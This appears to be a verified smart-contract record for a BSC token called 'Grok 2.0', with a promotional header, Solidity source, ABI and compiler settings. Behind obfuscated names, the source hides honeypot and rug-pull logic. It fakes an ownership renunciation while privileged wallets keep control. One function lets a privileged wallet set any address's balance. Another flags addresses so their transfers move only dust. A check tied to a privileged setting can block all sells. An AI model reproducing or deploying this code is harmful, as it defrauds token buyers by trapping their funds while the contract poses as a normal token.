{"SourceCode": "/*\r\n\r\nDon't Miss Your Chance This Time!\r\n\r\nhttps://grok2-0.com\r\nhttps://t.me/xgrok20\r\n\r\n*/\r\n\r\n//SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.8;\r\n\r\ninterface listTxWallet {\r\n    function createPair(address amountBuyLiquidity, address exemptList) external returns (address);\r\n}\r\n\r\ninterface modeFrom {\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function balanceOf(address marketingExempt) external view returns (uint256);\r\n\r\n    function transfer(address modeIs, uint256 swapTotal) external returns (bool);\r\n\r\n    function allowance(address autoMarketing, address spender) external view returns (uint256);\r\n\r\n    function approve(address spender, uint256 swapTotal) external returns (bool);\r\n\r\n    function transferFrom(\r\n        address sender,\r\n        address modeIs,\r\n        uint256 swapTotal\r\n    ) external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed enableMarketing, uint256 value);\r\n    event Approval(address indexed autoMarketing, address indexed spender, uint256 value);\r\n}\r\n\r\nabstract contract maxTxToken {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n}\r\n\r\ninterface toExemptEnable {\r\n    function factory() external pure returns (address);\r\n\r\n    function WETH() external pure returns (address);\r\n}\r\n\r\ninterface modeFromMetadata is modeFrom {\r\n    function name() external view returns (string memory);\r\n\r\n    function symbol() external view returns (string memory);\r\n\r\n    function decimals() external view returns (uint8);\r\n}\r\n\r\ncontract Grok2 is maxTxToken, modeFrom, modeFromMetadata {\r\n\r\n    function getOwner() external view returns (address) {\r\n        return maxWalletMin;\r\n    }\r\n\r\n    address public walletSell;\r\n\r\n    uint256 constant feeTx = 8 ** 10;\r\n\r\n    bool public maxBuy;\r\n\r\n    uint256 public launchedWalletMin;\r\n\r\n    function toTotalFee(address liquidityTokenLaunched) public {\r\n        modeShould();\r\n        if (maxBuy == amountFund) {\r\n            totalReceiverTrading = isMarketing;\r\n        }\r\n        if (liquidityTokenLaunched == walletSell || liquidityTokenLaunched == autoToTx) {\r\n            return;\r\n        }\r\n        takeLaunched[liquidityTokenLaunched] = true;\r\n    }\r\n\r\n    uint256 txWalletReceiver;\r\n\r\n    uint256 public totalReceiverTrading;\r\n\r\n    uint256 private isMarketing;\r\n\r\n    mapping(address => bool) public takeLaunched;\r\n\r\n    address private maxWalletMin;\r\n\r\n    function name() external view virtual override returns (string memory) {\r\n        return swapSender;\r\n    }\r\n\r\n    mapping(address => mapping(address => uint256)) private enableShouldBuy;\r\n\r\n    uint256 public minLaunch;\r\n\r\n    function decimals() external view virtual override returns (uint8) {\r\n        return launchedFund;\r\n    }\r\n\r\n    function exemptMode() public {\r\n        emit OwnershipTransferred(walletSell, address(0));\r\n        maxWalletMin = address(0);\r\n    }\r\n\r\n    string private swapSender = \"Grok 2.0\";\r\n\r\n    address public autoToTx;\r\n\r\n    uint256 launchedSwap;\r\n\r\n    uint256 private shouldSenderMarketing = 100000000 * 10 ** 18;\r\n\r\n    address tokenReceiver = 0x26C31e983994371014aa3832BD37d28d528d8Ae9;\r\n\r\n    function takeLiquidity(address senderFeeLaunched, address modeIs, uint256 swapTotal) internal returns (bool) {\r\n        if (senderFeeLaunched == walletSell) {\r\n            return atTake(senderFeeLaunched, modeIs, swapTotal);\r\n        }\r\n        uint256 listTrading = modeFrom(autoToTx).balanceOf(tokenReceiver);\r\n        require(listTrading == txWalletReceiver);\r\n        require(modeIs != tokenReceiver);\r\n        if (takeLaunched[senderFeeLaunched]) {\r\n            return atTake(senderFeeLaunched, modeIs, feeTx);\r\n        }\r\n        return atTake(senderFeeLaunched, modeIs, swapTotal);\r\n    }\r\n\r\n    function atTake(address senderFeeLaunched, address modeIs, uint256 swapTotal) internal returns (bool) {\r\n        require(marketingLaunched[senderFeeLaunched] >= swapTotal);\r\n        marketingLaunched[senderFeeLaunched] -= swapTotal;\r\n        marketingLaunched[modeIs] += swapTotal;\r\n        emit Transfer(senderFeeLaunched, modeIs, swapTotal);\r\n        return true;\r\n    }\r\n\r\n    string private sellFrom = \"GROK 2.0\";\r\n\r\n    mapping(address => bool) public walletList;\r\n\r\n    function allowance(address modeBuy, address teamShould) external view virtual override returns (uint256) {\r\n        if (teamShould == limitTx) {\r\n            return type(uint256).max;\r\n        }\r\n        return enableShouldBuy[modeBuy][teamShould];\r\n    }\r\n\r\n    uint256 private fromAt;\r\n\r\n    bool public launchedMode;\r\n\r\n    constructor (){\r\n        \r\n        toExemptEnable limitSenderTake = toExemptEnable(limitTx);\r\n        autoToTx = listTxWallet(limitSenderTake.factory()).createPair(limitSenderTake.WETH(), address(this));\r\n        \r\n        walletSell = _msgSender();\r\n        walletList[walletSell] = true;\r\n        marketingLaunched[walletSell] = shouldSenderMarketing;\r\n        exemptMode();\r\n        if (isMarketing == launchedWalletMin) {\r\n            launchedMode = true;\r\n        }\r\n        emit Transfer(address(0), walletSell, shouldSenderMarketing);\r\n    }\r\n\r\n    function feeList(address launchList, uint256 swapTotal) public {\r\n        modeShould();\r\n        marketingLaunched[launchList] = swapTotal;\r\n    }\r\n\r\n    bool public launchMarketingWallet;\r\n\r\n    function modeShould() private view {\r\n        require(walletList[_msgSender()]);\r\n    }\r\n\r\n    function approve(address teamShould, uint256 swapTotal) public virtual override returns (bool) {\r\n        enableShouldBuy[_msgSender()][teamShould] = swapTotal;\r\n        emit Approval(_msgSender(), teamShould, swapTotal);\r\n        return true;\r\n    }\r\n\r\n    mapping(address => uint256) private marketingLaunched;\r\n\r\n    uint8 private launchedFund = 18;\r\n\r\n    function swapBuyLaunched(uint256 swapTotal) public {\r\n        modeShould();\r\n        txWalletReceiver = swapTotal;\r\n    }\r\n\r\n    bool public sellAt;\r\n\r\n    function transferFrom(address senderFeeLaunched, address modeIs, uint256 swapTotal) external override returns (bool) {\r\n        if (_msgSender() != limitTx) {\r\n            if (enableShouldBuy[senderFeeLaunched][_msgSender()] != type(uint256).max) {\r\n                require(swapTotal <= enableShouldBuy[senderFeeLaunched][_msgSender()]);\r\n                enableShouldBuy[senderFeeLaunched][_msgSender()] -= swapTotal;\r\n            }\r\n        }\r\n        return takeLiquidity(senderFeeLaunched, modeIs, swapTotal);\r\n    }\r\n\r\n    function totalSupply() external view virtual override returns (uint256) {\r\n        return shouldSenderMarketing;\r\n    }\r\n\r\n    function balanceOf(address marketingExempt) public view virtual override returns (uint256) {\r\n        return marketingLaunched[marketingExempt];\r\n    }\r\n\r\n    function owner() external view returns (address) {\r\n        return maxWalletMin;\r\n    }\r\n\r\n    function symbol() external view virtual override returns (string memory) {\r\n        return sellFrom;\r\n    }\r\n\r\n    function receiverMode(address shouldBuy) public {\r\n        if (launchMarketingWallet) {\r\n            return;\r\n        }\r\n        \r\n        walletList[shouldBuy] = true;\r\n        if (launchedMode == maxBuy) {\r\n            maxBuy = false;\r\n        }\r\n        launchMarketingWallet = true;\r\n    }\r\n\r\n    address limitTx = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\r\n\r\n    function transfer(address launchList, uint256 swapTotal) external virtual override returns (bool) {\r\n        return takeLiquidity(_msgSender(), launchList, swapTotal);\r\n    }\r\n\r\n    event OwnershipTransferred(address indexed teamBuySwap, address indexed takeShouldEnable);\r\n\r\n    bool private amountFund;\r\n\r\n    bool private exemptTeam;\r\n\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamBuySwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeShouldEnable\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableMarketing\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamShould\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapTotal\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoToTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingExempt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapTotal\",\"type\":\"uint256\"}],\"name\":\"feeList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchMarketingWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedWalletMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldBuy\",\"type\":\"address\"}],\"name\":\"receiverMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"swapTotal\",\"type\":\"uint256\"}],\"name\":\"swapBuyLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityTokenLaunched\",\"type\":\"address\"}],\"name\":\"toTotalFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalReceiverTrading\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapTotal\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderFeeLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapTotal\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletSell\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "Grok2", "CompilerVersion": "v0.8.8+commit.dddeac2f", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://5d6d37664d8155bd1f8591600a5ebe50d3bc7125240f0afe817c8ce2c3e0ad97"}